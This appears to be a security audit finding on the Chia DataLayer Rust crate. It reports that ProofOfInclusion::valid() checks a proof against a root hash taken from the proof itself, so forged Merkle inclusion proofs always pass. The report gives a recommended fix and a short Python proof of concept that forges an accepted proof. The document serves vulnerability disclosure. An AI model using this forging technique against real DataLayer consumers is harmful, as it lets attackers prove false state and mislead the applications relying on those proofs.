### Title
DataLayer `ProofOfInclusion::valid()` Performs Tautological Self-Validation — Forged Inclusion Proofs Always Pass - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
`ProofOfInclusion::valid()` in the DataLayer Merkle proof module contains a tautological final check: after iterating through layers and setting `existing_hash = calculated_hash` (which equals `layer.combined_hash` by the loop invariant), it compares `existing_hash == self.root_hash()`, where `root_hash()` returns `self.layers.last().combined_hash` — the same value. The final check is always `true` for any non-empty, internally-consistent proof. An attacker can forge a proof of inclusion for any arbitrary key-value pair against any tree root and `valid()` will return `true`.

### Finding Description

The `valid()` function in `ProofOfInclusion` is the sole public API for verifying DataLayer Merkle proofs. It iterates through layers, computing each `calculated_hash` and comparing it to `layer.combined_hash`. If they match, it sets `existing_hash = calculated_hash` and continues. After the loop, it performs the final check:

```rust
existing_hash == self.root_hash()
```

`root_hash()` is defined as:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // <-- derived from the proof itself
    } else {
        self.node_hash
    }
}
```

After the loop, `existing_hash` holds the last `calculated_hash`, which the loop already verified equals `layer.combined_hash`. `self.root_hash()` returns that same `layer.combined_hash`. The comparison is therefore always `true` when layers are non-empty and internally consistent.

The correct implementation would compare `existing_hash` against an **externally supplied** root hash (the actual committed tree root), not against a value derived from the proof itself. [1](#0-0)

### Impact Explanation

**High. DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state.**

An attacker can:
1. Choose any arbitrary `node_hash` (representing any key-value pair they wish to "prove").
2. Build a chain of `ProofOfInclusionLayer` values where each `combined_hash` is computed correctly from the previous hash and a freely chosen `other_hash` — making the chain internally consistent.
3. Call `proof.valid()` — it returns `true` regardless of what the actual committed DataLayer tree root is.

Any consumer that relies on `proof.valid()` to gate DataLayer state acceptance (e.g., verifying that a key-value pair is committed in a specific tree before acting on it) will accept the forged proof. This allows proving invalid state against any tree root.

The fuzz target and all tests call `proof.valid()` without separately checking the root hash, confirming this is the intended and only verification path: [5](#0-4) [6](#0-5) 

### Likelihood Explanation

**High.** The `ProofOfInclusion` struct is:
- Constructable directly from Python via `__new__` with arbitrary field values.
- Deserializable from attacker-controlled bytes via `from_bytes` / `from_bytes_unchecked`.
- Exposed as a `pyclass` with all fields publicly readable and writable (`get_all`, `from_py_object`).

No privilege, key material, or chain access is required. Any unprivileged caller can construct a forged proof and pass `valid()`.

### Recommendation

The `valid()` method must accept an external root hash parameter and compare `existing_hash` against it at the end, not against `self.root_hash()`:

```rust
pub fn valid_against_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == *expected_root  // compare against external root, not self-derived
}
```

The existing `valid()` method (which performs only internal consistency checking) should either be removed or clearly documented as not a security check. All call sites — including the Python bindings, fuzz targets, and tests — must be updated to supply the actual committed tree root.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer, Side
import hashlib

# Arbitrary "leaf" hash — represents any key-value pair the attacker chooses
fake_node_hash = bytes(range(32))

# Build one internally-consistent layer with a freely chosen sibling hash
sibling_hash = bytes([0xAB] * 32)
combined = hashlib.sha256(b"\x02" + fake_node_hash + sibling_hash).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=Side.Right,   # sibling is on the right
    other_hash=sibling_hash,
    combined_hash=combined,        # attacker sets this to match their computation
)

# Construct a forged proof — node_hash and combined_hash are entirely attacker-chosen
forged_proof = ProofOfInclusion(node_hash=fake_node_hash, layers=[layer])

# valid() returns True even though this proof was never generated from any real tree
assert forged_proof.valid(), "Forged proof accepted!"

# The "root" this proof claims is forged_proof.root_hash() == combined
# which has nothing to do with any real committed DataLayer tree root
print("Forged root:", forged_proof.root_hash().hex())
```

The loop sets `existing_hash = calculated_hash = combined`, and `root_hash()` returns `layers[-1].combined_hash = combined`, so the final comparison `existing_hash == self.root_hash()` is `combined == combined` — always `True`. [1](#0-0)
